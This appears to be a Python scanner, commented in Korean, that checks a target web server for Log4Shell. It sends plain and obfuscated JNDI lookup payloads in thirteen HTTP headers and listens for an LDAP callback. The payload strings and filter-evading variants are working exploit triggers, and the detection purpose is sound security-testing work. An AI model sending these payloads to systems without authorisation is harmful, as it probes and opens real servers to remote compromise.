#!/usr/bin/env python3
"""
Log4Shell (CVE-2021-44228) 탐지 스크립트

HTTP 요청의 각종 헤더에 JNDI 페이로드를 삽입하여
로그 파이프라인에 Log4j가 있는지 확인합니다.

Usage:
  python3 log4shell-check.py <target_url> --listen <your_ip>
  python3 log4shell-check.py <target_url> --callback <callback_url>

Examples:
  python3 log4shell-check.py http://172.20.169.234 --listen 10.100.5.50
  python3 log4shell-check.py http://172.20.169.234 --callback http://your.burpcollaborator.net
"""

import sys
import argparse
import requests
import socket
import threading
import time
from urllib.parse import urlparse

HEADERS_TO_INJECT = [
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Api-Version",
    "X-Request-Id",
    "Authorization",
    "Accept-Language",
    "Cookie",
    "CF-Connecting-IP",
    "True-Client-IP",
    "Forwarded",
    "Contact",
]

PAYLOADS = [
    "${jndi:ldap://%s:%d/log4shell-%s}",
    "${${lower:j}ndi:${lower:l}dap://%s:%d/log4shell-obf1-%s}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s:%d/log4shell-obf2-%s}",
]


class CallbackListener:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.hits = []
        self.running = False

    def start(self):
        self.running = True
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.settimeout(1)
        self.sock.bind(("0.0.0.0", self.port))
        self.sock.listen(5)
        self.thread = threading.Thread(target=self._listen, daemon=True)
        self.thread.start()

    def _listen(self):
        while self.running:
            try:
                conn, addr = self.sock.accept()
                data = conn.recv(1024)
                self.hits.append({"from": addr, "data": data})
                print(f"\n  [!!!] CALLBACK RECEIVED from {addr[0]}:{addr[1]}")
                conn.close()
            except socket.timeout:
                continue
            except Exception:
                break

    def stop(self):
        self.running = False
        self.sock.close()


def send_payloads(target, callback_host, callback_port):
    print(f"\n[*] Target: {target}")
    print(f"[*] Callback: {callback_host}:{callback_port}")
    print(f"[*] Injecting {len(HEADERS_TO_INJECT)} headers x {len(PAYLOADS)} payloads\n")

    count = 0
    for header in HEADERS_TO_INJECT:
        for i, tmpl in enumerate(PAYLOADS):
            tag = f"{header.lower()}-v{i}"
            payload = tmpl % (callback_host, callback_port, tag)

            headers = {header: payload}
            if header != "User-Agent":
                headers["User-Agent"] = "Mozilla/5.0 (Log4Shell Check)"

            try:
                requests.get(target, headers=headers, timeout=5)
                count += 1
                print(f"  [{count:02d}] {header}: {payload[:80]}...")
            except Exception as e:
                print(f"  [{count:02d}] {header}: FAILED ({e})")

    return count


def main():
    parser = argparse.ArgumentParser(description="Log4Shell Detection via Log Pipeline")
    parser.add_argument("target", help="Target URL (e.g. http://172.20.169.234)")
    parser.add_argument("--listen", help="Your IP — starts local LDAP listener on port 1389")
    parser.add_argument("--callback", help="External callback URL (e.g. Burp Collaborator)")
    parser.add_argument("--port", type=int, default=1389, help="Listener port (default: 1389)")
    parser.add_argument("--wait", type=int, default=30, help="Callback wait time in seconds (default: 30)")
    args = parser.parse_args()

    if not args.listen and not args.callback:
        print("[!] --listen <your_ip> 또는 --callback <url> 중 하나를 지정하세요.")
        sys.exit(1)

    listener = None

    if args.listen:
        callback_host = args.listen
        callback_port = args.port

        listener = CallbackListener(args.listen, args.port)
        try:
            listener.start()
            print(f"[+] Listener started on 0.0.0.0:{args.port}")
        except Exception as e:
            print(f"[!] Listener 시작 실패: {e}")
            print(f"    sudo 로 실행하거나 --port 로 다른 포트를 지정하세요.")
            sys.exit(1)
    else:
        parsed = urlparse(args.callback)
        callback_host = parsed.hostname
        callback_port = parsed.port or 80

    total = send_payloads(args.target, callback_host, callback_port)

    if listener:
        print(f"\n[*] {total}개 페이로드 전송 완료.")
        print(f"[*] 콜백 대기 중... ({args.wait}초)")
        print(f"    로그가 수집 서버를 거쳐 Log4j에 도달하면 콜백이 옵니다.\n")

        try:
            for i in range(args.wait):
                if listener.hits:
                    break
                time.sleep(1)
                if (i + 1) % 10 == 0:
                    print(f"    ... {args.wait - i - 1}초 남음")
        except KeyboardInterrupt:
            pass

        listener.stop()

        if listener.hits:
            print(f"\n{'='*50}")
            print(f" [+] VULNERABLE! Log4Shell 콜백 {len(listener.hits)}건 수신")
            for h in listener.hits:
                print(f"     from {h['from'][0]}:{h['from'][1]}")
            print(f"{'='*50}")
        else:
            print(f"\n[-] 콜백 없음. 취약하지 않거나 로그가 아직 처리되지 않았을 수 있습니다.")
    else:
        print(f"\n[*] {total}개 페이로드 전송 완료.")
        print(f"[*] {args.callback} 에서 콜백을 확인하세요.")


if __name__ == "__main__":
    main()
